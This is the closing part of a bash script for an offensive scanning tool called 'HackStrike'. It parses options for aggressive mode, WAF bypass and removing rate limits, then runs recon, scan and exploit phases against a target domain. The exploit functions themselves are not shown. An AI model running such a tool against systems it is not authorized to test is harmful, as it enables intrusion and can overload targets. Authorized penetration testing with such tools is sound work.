    echo "  --no-limit          Remove all rate limits (dangerous)"
    echo ""
    echo "Examples:"
    echo "  $0 example.com"
    echo "  $0 -m recon -t 100 example.com"
    echo "  $0 -a -d --no-limit target.com"
    echo ""
}

main() {
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            -h|--help)
                usage
                exit 0
                ;;
            -m|--mode)
                SCAN_MODE="$2"
                shift 2
                ;;
            -t|--threads)
                THREADS="$2"
                shift 2
                ;;
            -r|--rate)
                RATE_LIMIT="$2"
                shift 2
                ;;
            -o|--output)
                OUTPUT_DIR="$2"
                shift 2
                ;;
            -a|--aggressive)
                AGGRESSIVE=true
                shift
                ;;
            -d|--deep)
                DEEP_SCAN=true
                shift
                ;;
            -w|--waf-bypass)
                WAF_BYPASS=true
                shift
                ;;
            --no-limit)
                NO_LIMIT=true
                RATE_LIMIT=0
                THREADS=100
                shift
                ;;
            *)
                TARGET="$1"
                shift
                ;;
        esac
    done
    
    # Validate target
    if [[ -z "$TARGET" ]]; then
        banner
        error "No target specified!"
        echo ""
        usage
        exit 1
    fi
    
    # Remove protocol if present
    TARGET=$(echo "$TARGET" | sed 's|https\?://||' | sed 's|/.*||')
    
    banner
    
    echo -e "${WHITE}Target:${NC} $TARGET"
    echo -e "${WHITE}Mode:${NC} $SCAN_MODE"
    echo -e "${WHITE}Threads:${NC} $THREADS"
    echo -e "${WHITE}Rate Limit:${NC} $RATE_LIMIT/s"
    [[ "$AGGRESSIVE" == true ]] && echo -e "${RED}Aggressive Mode:${NC} ENABLED"
    [[ "$DEEP_SCAN" == true ]] && echo -e "${YELLOW}Deep Scan:${NC} ENABLED"
    [[ "$NO_LIMIT" == true ]] && echo -e "${RED}No Limits:${NC} ENABLED (USE WITH CAUTION)"
    echo ""
    
    # Confirmation
    read -p "$(echo -e ${YELLOW}[!]${NC}) Start scan on $TARGET? [Y/n] " confirm
    if [[ "$confirm" =~ ^[Nn]$ ]]; then
        error "Scan cancelled"
        exit 0
    fi
    
    # Setup
    check_tools
    setup_output
    
    # Run phases based on mode
    case $SCAN_MODE in
        full)
            phase_recon
            phase_scan
            phase_exploit
            phase_report
            ;;
        recon)
            phase_recon
            phase_report
            ;;
        scan)
            phase_recon
            phase_scan
            phase_report
            ;;
        exploit)
            phase_recon
            phase_scan
            phase_exploit
            phase_report
            ;;
        *)
            error "Invalid mode: $SCAN_MODE"
            exit 1
            ;;
    esac
    
    success "HackStrike scan complete!"
    echo ""
}

# Run
main "$@"
